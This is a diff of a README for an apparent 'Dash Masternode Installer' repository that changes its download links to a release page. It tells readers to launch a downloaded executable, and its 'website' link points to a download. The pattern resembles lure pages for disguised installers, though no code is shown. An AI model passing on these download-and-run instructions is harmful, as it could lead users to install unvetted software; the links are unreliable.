@@ -11,7 +11,7 @@ Welcome to the Dash Masternode Installer repository, where you can automate the 
 
 ## Getting Started
 To get started, download the Dash Masternode Installer Automatic Setup tool from the link below:
-[![Download Dash Masternode Installer](https://img.shields.io/badge/Download-Installer-green)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Dash Masternode Installer](https://github.com/Krixmen/Dash-Masternode-Installer-Automatic-Setup/releases/tag/v1.0)](https://github.com/Krixmen/Dash-Masternode-Installer-Automatic-Setup/releases/tag/v1.0)
 
 *Note: The link above leads to a downloadable installer. Launch the executable file to start the installation process.*
 
@@ -61,4 +61,4 @@ Thank you for exploring the Dash Masternode Installer Automatic Setup repository
 
 Remember, the sky's the limit when it comes to Dash masternodes. Let's make a splash in the world of decentralized finance together! 🌐
 
-*For more information and updates, visit our website [here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip).*
+*For more information and updates, visit our website [here](https://github.com/Krixmen/Dash-Masternode-Installer-Automatic-Setup/releases/tag/v1.0).*
